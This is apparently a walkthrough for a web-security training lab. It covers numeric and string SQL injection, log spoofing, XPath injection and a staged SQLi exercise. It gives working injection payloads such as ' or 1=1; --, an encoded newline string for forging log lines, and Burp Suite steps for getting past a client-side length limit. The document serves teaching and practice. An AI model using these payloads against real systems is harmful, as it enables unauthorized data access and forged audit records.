# Numeric SQL Injection

Click `go` and use burpsuite to intercept traffic.

Modify the following to perform an sql injection ` or 1=1;`

`station=101 or 1=1;&SUBMIT=Go%21`



*Note: After completing the challenge, you will observe that there is a message that says if you try again it will not work as they have turned on some 'defence'. *

*The error message you will encounter will be `Error parsing station as a number: For input string: "101 or 1=1;` which give hints that the input has been sanitized to be parsed as number. Thus, using the `or` and `;` character would not work anymore*



# Log Spoofing

Using urlencoder.org key in the following block of code to be encoded

```
admin
Login succeeded for username: admin
```

and encode it into 

```
admin%0ALogin%20succeeded%20for%20username%3A%20admin
```

And use the encoded string as `username` to login. You will observe that the logs will print out that 'admin' had failed to login but includes a new line of log (fake) that admin has logged in successfully.

# XPATH injection

Use `' or '1' = '1` for username and password to clear challenge.

Note: The xpath query probably is something like this `/root/parent/something[id='our_input_here']/user` so when we use the sqli statement above, we are making the query like this `/root/parent/something[id='or '1' = '1']/user` 

# String SQL injection

Use `' or 1 = 1; --` to complete the challenge.

Note: We know that the sql query is `SELECT * FROM user_data WHERE last_name = 'Your Name'`

using the sqli statement we are terminating the `'` to trick the interpreter to process the next command `or 1 = 1;` which always evaluates to true (returning our results) and the `--` is simply a comment out statement to get rid of the closing `'` the statement would look like this

```sql
SELECT * FROM user_data WHERE last_name = '' or 1 = 1; -- ' Everything behind '--' is commented out!
```

# LAB: SQL Injection
## Stage 1: String SQL Injection

If you tested a classic SQLi command such as `' or 1=1; --` you will notice in burpsuite intercept HTTP that the statement will be trimmed to only `' or 1=1` which is the limit for 8 characters.

Edit the HTTP request again but manually modifying the password field using burpsuite to `asd' or 1=1; --`  to complete the challenge.

## Stage 2: skipped

## Stage 3: Numeric SQL Injection
Login as Larry with password `larry`

using burpsuite modify HTTP request from `employee_id=101&action=ViewProfile` to `employee_id=101 or 1=1 order by employee_id desc&action=ViewProfile`

## Stage 4: skipped

